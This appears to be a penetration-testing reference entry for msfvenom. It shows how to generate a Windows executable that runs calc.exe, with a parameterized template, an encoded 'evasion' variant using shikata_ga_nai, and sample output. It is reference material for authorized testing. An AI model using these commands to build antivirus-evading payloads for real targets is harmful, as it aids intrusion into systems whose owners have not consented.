---
id: 8dd58733-1c07-4ca7-88aa-994a9b3ed2a7
name: msfvenom-execute-calculator
type: command
executor: bash
data: msfvenom -p windows/exec cmd=calc.exe -a x86 -f exe > msf-calc.exe
output: >
  root@hacker:~# msfvenom -p windows/exec cmd=calc.exe -a x86 -f exe >
  msf-calc.exe

  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the
  payload

  No encoder or badchars specified, outputting raw payload

  Payload size: 193 bytes

  Final size of exe file: 73802 bytes
created_at: '2019-10-10T18:41:08.050852+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - payload-generation
  - execution
verified: true
validated: true
---

# msfvenom-execute-calculator

## Command

```bash
msfvenom -p $_PAYLOAD cmd=$__COMMAND -a $_ARCH -f $_FORMAT > $_OUTPUT_FILE
```

## Description

This command uses msfvenom to generate a Windows executable payload that executes a specified command (in this case, calc.exe, the Windows Calculator) upon running the file. It is useful for testing command execution payloads in penetration testing scenarios, such as verifying exploit delivery or demonstrating simple post-exploitation capabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-p $_PAYLOAD` | Payload type (e.g., windows/exec for command execution) | Yes |
| `cmd=$__COMMAND` | Command to execute (e.g., calc.exe) | Yes |
| `-a $_ARCH` | Target architecture (e.g., x86 for 32-bit) | Yes |
| `-f $_FORMAT` | Output format (e.g., exe for executable) | Yes |
| `> $_OUTPUT_FILE` | Redirect output to file (e.g., msf-calc.exe) | Yes |

## Examples

### Basic Usage

Generate the calculator executable:
```bash
msfvenom -p windows/exec cmd=calc.exe -a x86 -f exe > msf-calc.exe
```

### Advanced Usage

Add encoding for evasion:
```bash
msfvenom -p windows/exec cmd=calc.exe -a x86 -e x86/shikata_ga_nai -i 3 -f exe > encoded-calc.exe
```

## Expected Output

Description of what output to expect when the command runs successfully.

```
root@hacker:~# msfvenom -p windows/exec cmd=calc.exe -a x86 -f exe > msf-calc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 193 bytes
Final size of exe file: 73802 bytes
```

The command creates an EXE file (msf-calc.exe) that, when executed on a Windows target, launches the Calculator application without additional prompts.

## Related

- [[tools/msfvenom]]
- [[commands/msfvenom-reverse-tcp-shell]]
